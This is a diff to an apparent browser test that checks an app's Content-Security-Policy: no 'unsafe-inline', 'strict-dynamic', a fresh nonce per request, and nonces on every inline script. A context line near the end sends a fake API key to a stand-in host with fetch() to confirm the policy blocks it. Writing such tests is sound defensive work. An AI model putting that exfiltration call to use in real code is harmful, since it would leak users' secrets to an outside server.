@@ -262,6 +262,27 @@ const FLOWS = [
       note(header.includes("connect-src"), `/app is served with a connect-src policy (${header.slice(0, 60) || "no header"}…)`);
       note(header.includes("https://api.anthropic.com"), "and the BYOK path is in it, or the assistant would be broken by it");
 
+      // The part that is easy to lose. `script-src` used to carry 'unsafe-inline' because Next
+      // hydrates through inline scripts; it now carries a per-request nonce instead, which only
+      // works while the page is rendered per request. Someone adding `export const dynamic =
+      // "force-static"` — or a future Next that prerenders anyway — would put 'unsafe-inline'
+      // back by accident, and nothing else here would notice.
+      const scriptSrc = header.split(";").map((d) => d.trim()).find((d) => d.startsWith("script-src")) ?? "";
+      note(!scriptSrc.includes("'unsafe-inline'"), `script-src has no 'unsafe-inline' (${scriptSrc || "missing"})`);
+      note(scriptSrc.includes("'strict-dynamic'"), "and 'strict-dynamic', so a script injected from our own origin is not simply allowed");
+      const first = scriptSrc.match(/'nonce-([^']+)'/)?.[1];
+      const second = (await page.goto(ORIGIN + "/app"))?.headers()["content-security-policy"]?.match(/'nonce-([^']+)'/)?.[1];
+      note(Boolean(first) && Boolean(second) && first !== second, "with a nonce that is different on the next request");
+
+      const stamped = await page.evaluate(() => {
+        const inline = [...document.querySelectorAll("script:not([src])")];
+        return { total: inline.length, nonced: inline.filter((s) => s.nonce || s.getAttribute("nonce")).length };
+      });
+      note(
+        stamped.total > 0 && stamped.nonced === stamped.total,
+        `and every inline script in the document carries it (${stamped.nonced}/${stamped.total})`
+      );
+
       const refused = await page.evaluate(async () => {
         try {
           await fetch("https://exfiltration.invalid/?k=sk-ant-stolen");
